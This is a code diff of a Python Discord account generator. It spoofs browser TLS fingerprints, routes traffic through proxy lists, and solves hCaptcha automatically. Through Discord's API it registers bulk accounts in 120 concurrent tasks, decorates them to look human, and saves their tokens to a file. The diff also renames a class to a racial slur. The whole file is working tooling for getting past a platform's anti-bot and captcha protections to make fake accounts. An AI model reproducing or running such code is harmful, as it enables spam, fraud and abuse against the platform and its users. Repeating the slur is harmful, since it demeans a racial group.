@@ -1,11 +1,30 @@
+import asyncio
+import base64
+import json
+import os
+import random
+import re
+import secrets
 import sys
-
-import tls_client, json, websocket, random, base64, threading, re, os, time, requests, httpx
-from colorama import Fore, Style
-from datetime import timedelta
-from libss.solver import Solver
+import threading
+import time
 import traceback
+from datetime import timedelta
+from typing import Union
+import aiomisc
+import anyio
+import httpx
+import requests
+import tls_client
+import trio
+import websocket
+from colorama import Fore, Style
+from libss.solver import Solver
 
+#
+# if __name__ == '__main__':
+#     NewHSW()
+#     while 1: pass
 names = open('input/names.txt', "r", encoding="utf-8").read().splitlines()
 proxies = open('input/proxies.txt', "r", encoding="utf-8").read().splitlines()
 proxy_pool = []
@@ -17,7 +36,8 @@ threadList = []
 locked, unlocked, total = 0, 0, 0
 
 
-class NetNutFunny(tls_client.Session):
+class Nigger(tls_client.Session):
+    @aiomisc.threaded_separate
     def execute_request(self, *args, **kwargs):
         for _ in range(100):
             try:
@@ -26,14 +46,14 @@ class NetNutFunny(tls_client.Session):
                 pass
 
 
-def updateTitle():
-    genStartedAs = time.time()
+def update_title():
+    gen_started_at = time.time()
     while True:
         try:
-            delta = timedelta(seconds=round(time.time() - genStartedAs))
+            delta = timedelta(seconds=round(time.time() - gen_started_at))
             elapsed = str(delta).split(".")[0]
             unlocked_rate = round(unlocked / total * 100, 2)
-            upm = round(unlocked / ((time.time() - genStartedAs) / 60))
+            upm = round(unlocked / ((time.time() - gen_started_at) / 60))
             sys.stdout.write(
                 f'\x1b]2;UNLOCKED: {unlocked} │ LOCKED: {locked} │ Rate: {unlocked_rate}% │ UPM: {upm} │ Elapsed: {elapsed}\x07')
             sys.stdout.flush()
@@ -42,73 +62,74 @@ def updateTitle():
         time.sleep(1)
 
 
-def split_invite(invite):
-    if invite.__contains__("discord.gg"):
-        if invite.startswith("https://"):
-            return invite.split("/")[3]
+def split_invite(__invite__):
+    if __invite__.__contains__("discord.gg"):
+        if __invite__.startswith("https://"):
+            return __invite__.split("/")[3]
         else:
-            return invite.split("/")[1]
+            return __invite__.split("/")[1]
     else:
-        return invite
+        return __invite__
 
 
-class Discord():
+def build_number():
+    res = requests.get("https://discord.com/login").text
+    file_with_build_num = 'https://discord.com/assets/' + \
+                          re.compile(r'assets/+([a-z0-9]+)\.js').findall(res)[-2] + '.js'
+    req_file_build = requests.get(file_with_build_num).text
+    index_of_build_num = req_file_build.find('buildNumber') + 24
+    return int(req_file_build[index_of_build_num:index_of_build_num + 6])
+
+
+version = build_number()
+
+
+class Discord:
     def __init__(self) -> None:
         global total
         global locked
         global unlocked
-        self.session = NetNutFunny(
+        self.fingerprint = None
+        self.proxy = "http://" + random.choice(proxy_pool)
+        self.session = Nigger(
             client_identifier="chrome_111",
             random_tls_extension_order=True,
-            h2_settings={"HEADER_TABLE_SIZE": 65536, "MAX_CONCURRENT_STREAMS": 1000, "INITIAL_WINDOW_SIZE": 6291456,
-                         "MAX_HEADER_LIST_SIZE": 262144},
-            h2_settings_order=["HEADER_TABLE_SIZE", "MAX_CONCURRENT_STREAMS", "INITIAL_WINDOW_SIZE",
-                               "MAX_HEADER_LIST_SIZE"],
-            supported_signature_algorithms=["ECDSAWithP256AndSHA256", "PSSWithSHA256", "PKCS1WithSHA256",
-                                            "ECDSAWithP384AndSHA384", "PSSWithSHA384", "PKCS1WithSHA384",
-                                            "PSSWithSHA512", "PKCS1WithSHA512", ],
+            h2_settings={"HEADER_TABLE_SIZE": 65536,"MAX_CONCURRENT_STREAMS": 1000,"INITIAL_WINDOW_SIZE": 6291456,"MAX_HEADER_LIST_SIZE": 262144},
+            h2_settings_order=["HEADER_TABLE_SIZE","MAX_CONCURRENT_STREAMS","INITIAL_WINDOW_SIZE","MAX_HEADER_LIST_SIZE"],
+            supported_signature_algorithms=["ECDSAWithP256AndSHA256","PSSWithSHA256","PKCS1WithSHA256","ECDSAWithP384AndSHA384","PSSWithSHA384","PKCS1WithSHA384","PSSWithSHA512","PKCS1WithSHA512",],
             supported_versions=["GREASE", "1.3", "1.2"],
             key_share_curves=["GREASE", "X25519"],
             cert_compression_algo="brotli",
-            pseudo_header_order=[":method", ":authority", ":scheme", ":path"],
+            pseudo_header_order=[":method",":authority",":scheme",":path"],
             connection_flow=15663105,
-            header_order=["accept", "user-agent", "accept-encoding", "accept-language"])
-        self.proxy = "http://" + random.choice(proxy_pool)
-        self.session.proxies = {"http": self.proxy, "https": self.proxy}
+            header_order=["accept","user-agent","accept-encoding","accept-language"])
+        self.session.proxies = self.proxy
         self.prop = {
             "os": "Windows",
             "browser": "Chrome",
             "device": "",
             "system_locale": "en-US",
-            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
-            "browser_version": "111.0.0.0",
+            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+            "browser_version": "115.0.0.0",
             "os_version": "10",
             "referrer": "",
             "referring_domain": "",
             "referrer_current": "",
             "referring_domain_current": "",
             "release_channel": "stable",
-            "client_build_number": self.build_number(),
+            "client_build_number": version,
             "client_event_source": None,
             "design_id": 0
         }
         self.super = base64.b64encode(json.dumps(self.prop, separators=(',', ':')).encode()).decode()
 
-    def build_number(self):
-        res = requests.get("https://discord.com/login").text
-        file_with_build_num = 'https://discord.com/assets/' + \
-                              re.compile(r'assets/+([a-z0-9]+)\.js').findall(res)[-2] + '.js'
-        req_file_build = requests.get(file_with_build_num).text
-        index_of_build_num = req_file_build.find('buildNumber') + 24
-        return int(req_file_build[index_of_build_num:index_of_build_num + 6])
-
-    def getFingerprint(self) -> str:
-        response = self.session.get('https://discord.com/api/v9/experiments')
+    async def get_fingerprint(self) -> str:
+        response = await self.session.get('https://discord.com/api/v9/experiments')
         self.session.cookies.update(response.cookies)
         self.session.cookies.update({"locale": "fr"})
         return response.json()['fingerprint']
 
-    def createAccount(self, captchaKey: str, fingerprint: str) -> str:
+    async def create_account(self, captcha_key: str, fingerprint: str) -> Union[str, None]:
         global total
         global locked
         global unlocked
@@ -125,32 +146,30 @@ class Discord():
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
             'x-fingerprint': fingerprint,
-            'x-track': 'eyJvcyI6IkxpbnV4IiwiYnJvd3NlciI6IkZpcmVmb3giLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjo5MS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzkxLjAiLCJicm93c2VyX3ZlcnNpb24iOiI5MS4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
+            'x-track': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTE1LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
         }
-        response = self.session.post('https://discord.com/api/v9/auth/register',
-                                     json={
-                                         'consent': True,
-                                         'fingerprint': fingerprint,
-                                         'invite': split_invite(invite),
-                                         'username': random.choice(names),
-                                         'captcha_key': captchaKey
-                                     }
-                                     )
-        if not 'token' in response.json():
-            print(f"({Fore.RED}-{Style.RESET_ALL}) - Rate Limited")
+        response = await self.session.post('https://discord.com/api/v9/auth/register',
+                                           json={
+                                               'consent': True,
+                                               'fingerprint': fingerprint,
+                                               "invite": "removal",
+                                               'username': random.choice(names),
+                                               'captcha_key': captcha_key
+                                           })
+        if 'token' not in response.json():
             return None
         return response.json()['token']
 
-    def generate(self) -> None:
+    async def generate(self) -> None:
         global total
         global locked
         global unlocked
-        solver = Solver(siteUrl='discord.com', siteKey='4c672d35-0701-42b2-88c3-78380b0db560', session=self.session)
-        captchaKey = solver.solve()
-        while captchaKey == None:
-            captchaKey = solver.solve()
+        solver = Solver(site_url='discord.com', site_key='4c672d35-0701-42b2-88c3-78380b0db560', session=self.session)
+        captcha_key = await solver.solve()
+        while captcha_key is None:
+            captcha_key = await solver.solve()
         self.session.headers = {
             'authority': 'discord.com',
             'accept': '*/*',
@@ -161,13 +180,13 @@ class Discord():
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'sec-gpc': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
-            'x-track': 'eyJvcyI6IkxpbnV4IiwiYnJvd3NlciI6IkZpcmVmb3giLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjo5MS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzkxLjAiLCJicm93c2VyX3ZlcnNpb24iOiI5MS4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
+            'x-track': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTE1LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
         }
-        fingerprint = self.getFingerprint()
+        fingerprint = await self.get_fingerprint()
         self.fingerprint = fingerprint
-        token = self.createAccount(captchaKey, fingerprint)
-        if token == None:
+        token = await self.create_account(captcha_key, fingerprint)
+        if token is None:
             return
         self.session.headers.pop('x-track')
         self.session.headers['referer'] = 'https://discord.com/channels/@me'
@@ -177,10 +196,10 @@ class Discord():
             'x-debug-options': 'bugReporterEnabled',
             'authorization': token
         })
-        if self.session.get('https://discord.com/api/v9/users/@me/affinities/users').status_code == 403:
+        if (await self.session.get('https://discord.com/api/v9/users/@me/affinities/users')).status_code != 200:
             total += 1
             locked += 1
-            print(f"({Fore.RED}-{Style.RESET_ALL}) - Locked [{token[:30]}*************************]")
+            print(f"[!] Locked: {token}")
             return
         total += 1
         ws = websocket.WebSocket()
@@ -196,7 +215,7 @@ class Discord():
                     "since": 0,
                     "activities": [
                         {
-                            "name": "to DortGen",
+                            "name": f"to {secrets.token_urlsafe(6)}",
                             "type": 2
                         }
                     ],
@@ -219,43 +238,42 @@ class Discord():
             os.path.join("input/image", random.choice(
                 [f for f in os.listdir("input/image") if f.endswith('.jpg') or f.endswith('.png')])),
             'rb').read()).decode('utf-8')}
-        added += "Avatar, "
-        response = self.session.patch('https://discord.com/api/v9/users/@me', json=json_data,
+        added += "Profile Picture, "
+        response = await self.session.patch('https://discord.com/api/v9/users/@me', json=json_data,
                                       proxy={"http": None, "https": None})
         if response.status_code == 200:
-            added += "BirthDate, "
-        response = self.session.post('https://discord.com/api/v9/hypesquad/online',
+            added += "Birth date, "
+        response = await self.session.post('https://discord.com/api/v9/hypesquad/online',
                                      json={'house_id': random.randint(1, 3)})
         if response.status_code == 204:
-            added += "Hypesquad, "
+            added += "HypeSquad, "
         bio = random.choice(open('input/bios.txt', 'r', encoding="utf-8").read().splitlines())
-        response = self.session.patch('https://discord.com/api/v9/users/%40me/profile', json={'bio': bio})
+        response = await self.session.patch('https://discord.com/api/v9/users/%40me/profile', json={'bio': bio})
         if response.status_code == 200:
-            added += "Bio "
+            added += "About Me "
         unlocked += 1
         open('tokens.txt', 'a').write(f'{token}\n')
         ws.close()
-        print(f"({Fore.GREEN}+{Style.RESET_ALL}) - Unlocked [{token[:30]}*************************]")
-        # print(f"({Fore.MAGENTA}~{Style.RESET_ALL}) - Humanized: {added}")
+        print(f"[!] Unlocked: {token} | {added}")
 
 
-def generate() -> None:
-    global total
-    global locked
-    global unlocked
+async def generate() -> None:
     while True:
         try:
             discord = Discord()
-            discord.generate()
+            await discord.generate()
         except Exception as e:
-            # traceback.print_exc()
-            # print(f"({Fore.RED}-{Style.RESET_ALL}) - Error [{e}")
             pass
 
 
+async def prepare():
+    await Solver.setup()
+    for _ in range(120):
+        asyncio.create_task(generate())
+    await asyncio.sleep(22220)
+
+
 if __name__ == "__main__":
-    os.system('cls')
-    invite = input(f'({Fore.LIGHTMAGENTA_EX}~{Fore.RESET}) - Invite (Leave Blank For None) → ')
-    for i in range(int(input(f'({Fore.LIGHTMAGENTA_EX}~{Fore.RESET}) - Threads → '))):
-        threading.Thread(target=generate).start()
-    threading.Thread(target=updateTitle).start()
+    os.system('cls' if os.name == 'nt' else 'clear')
+    threading.Thread(target=update_title).start()
+    asyncio.run(prepare())
